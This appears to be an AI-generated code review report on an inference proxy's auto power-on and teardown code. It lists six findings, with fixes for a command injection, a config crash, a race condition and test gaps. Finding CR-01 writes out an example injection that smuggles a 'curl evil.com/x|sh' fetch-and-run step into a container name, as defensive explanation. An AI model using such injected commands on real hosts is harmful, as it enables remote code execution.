---
phase: 23-auto-power-on-in-provisioner
reviewed: 2026-07-22T12:00:00Z
depth: standard
files_reviewed: 6
files_reviewed_list:
  - inference_proxy/provisioning/state.py
  - inference_proxy/config/settings.py
  - inference_proxy/provisioning/provisioner.py
  - inference_proxy/main.py
  - tests/provisioning/test_provisioner.py
  - tests/provisioning/test_state.py
findings:
  critical: 2
  warning: 3
  info: 1
  total: 6
status: issues_found
---

# Phase 23: Code Review Report

**Reviewed:** 2026-07-22T12:00:00Z
**Depth:** standard
**Files Reviewed:** 6
**Status:** issues_found

## Summary

Reviewed the auto power-on integration in the provisioner: new `POWERING_ON` enum member, `_power_on_if_needed` / `_wait_for_ssh` methods, Redfish client wiring in `main.py`, and associated tests. The new feature is structurally sound -- the provisioner correctly calls Redfish before SSH provisioning, catches `RedfishError` for best-effort semantics, and polls TCP port 22 with a deadline loop. Two critical issues were found: a command injection vector in teardown via unsanitised container names constructed from model strings, and a `NoneType` crash path when Redfish is half-configured.

## Critical Issues

### CR-01: Command injection via model-derived container name in teardown

**File:** `inference_proxy/provisioning/provisioner.py:417-421`
**Issue:** `teardown()` constructs shell commands by interpolating `container_name` directly into a string passed to `_ssh_run_command`:
```python
await self._ssh_run_command(hostname, f"podman rm --force {container_name}")
await self._ssh_run_command(hostname, f"podman stop {container_name} && podman rm {container_name}")
```
`container_name` is derived from `node.model` via `_derive_container_name`, which only does `rsplit("/", 1)[-1].lower()` -- no shell-metacharacter sanitisation. The model string originates from either `_run_start_vllm` script output parsing or from etcd (via registry lookup on line 403). If an attacker can write a crafted model name to etcd (e.g. `org/foo; curl evil.com/x|sh`), the teardown SSH command becomes `podman rm --force vllm-foo; curl evil.com/x|sh` -- arbitrary command execution on the target host.

**Fix:** Sanitise the container name to alphanumeric + hyphen + dot, or use `shlex.quote`:
```python
import shlex

# In teardown, when building the command:
safe_name = shlex.quote(container_name)
await self._ssh_run_command(hostname, f"podman rm --force {safe_name}")
```
Or validate `_derive_container_name` output against `^[a-zA-Z0-9._-]+$`.

### CR-02: AttributeError crash when bmc_username set but bmc_password is None

**File:** `inference_proxy/main.py:169`
**Issue:** The lifespan guard checks `if resolved_settings.redfish.bmc_username is not None` then unconditionally calls `resolved_settings.redfish.bmc_password.get_secret_value()`. If an operator sets `INFERENCE_PROXY_REDFISH__BMC_USERNAME=admin` without setting `INFERENCE_PROXY_REDFISH__BMC_PASSWORD`, `bmc_password` is `None` and `.get_secret_value()` raises `AttributeError`. The `# type: ignore[union-attr]` comment suppresses the mypy warning but does not fix the bug.
**Fix:** Either validate both fields together (a Pydantic `model_validator`), or add a runtime guard:
```python
if resolved_settings.redfish.bmc_username is not None:
    if resolved_settings.redfish.bmc_password is None:
        raise ValueError(
            "INFERENCE_PROXY_REDFISH__BMC_PASSWORD must be set when BMC_USERNAME is configured"
        )
    redfish_http = httpx.AsyncClient(
        auth=httpx.BasicAuth(
            username=resolved_settings.redfish.bmc_username,
            password=resolved_settings.redfish.bmc_password.get_secret_value(),
        ),
        ...
    )
```
The cleaner approach is a `model_validator` on `RedfishSettings` that enforces `bmc_password` is required when `bmc_username` is set.

## Warnings

### WR-01: Race condition on shared `_provision_started_at` instance field

**File:** `inference_proxy/provisioning/provisioner.py:234,396`
**Issue:** `NodeProvisioner` is a singleton stored in `app.state.provisioner` (main.py:201). `_provision_started_at` is set at the instance level in both `provision()` (line 234) and `teardown()` (line 396). If two concurrent provisions or a provision + teardown run simultaneously, the second call overwrites `_provision_started_at`, corrupting the `started_at` timestamp written to etcd for the first call. All `_update_state` calls use this shared field (line 108).
**Fix:** Pass `started_at` as a local variable through the call chain instead of storing it on the instance:
```python
async def provision(self, hostname: str, *, managed: bool = True) -> None:
    started_at = datetime.now(timezone.utc)
    # pass started_at to _update_state as a parameter
```

### WR-02: Stale docstrings claim 13-member enum; actual count is 19

**File:** `inference_proxy/provisioning/state.py:3`
**Issue:** Module docstring says "13-member StrEnum" but the enum now has 19 members after adding `POWERING_ON` and teardown steps (`DRAINING`, `STOPPING_CONTAINER`, `DEREGISTERING`, `TEARDOWN_COMPLETE`, `PENDING`). Misleading for anyone reading the module header.
**Fix:** Update the docstring to say "19-member StrEnum" or remove the count.

### WR-03: `test_member_values` does not verify POWERING_ON enum member

**File:** `tests/provisioning/test_state.py:28-49`
**Issue:** The `expected` dict in `test_member_values` has 18 entries but the enum has 19 members (`test_member_count` correctly asserts 19). `POWERING_ON` is missing from the expected dict. The test iterates the dict and checks each key exists in the enum, but never notices the missing member -- a new member could be added with a wrong value and this test would not catch it.
**Fix:** Add `"POWERING_ON": "powering_on"` to the expected dict, and assert `len(expected) == len(ProvisioningStep)` to prevent future drift.

## Info

### IN-01: `_make_teardown_provisioner` return type annotation is incorrect

**File:** `tests/provisioning/test_provisioner.py:671`
**Issue:** Return type says `tuple[..., list[str]]` but the function returns `tracker` (a `MagicMock`) as the last element (line 715). The annotation was likely left over from an earlier design where `state_steps` was returned.
**Fix:** Change to `tuple[NodeProvisioner, MagicMock, MagicMock, MagicMock, MagicMock]`.

---

_Reviewed: 2026-07-22T12:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
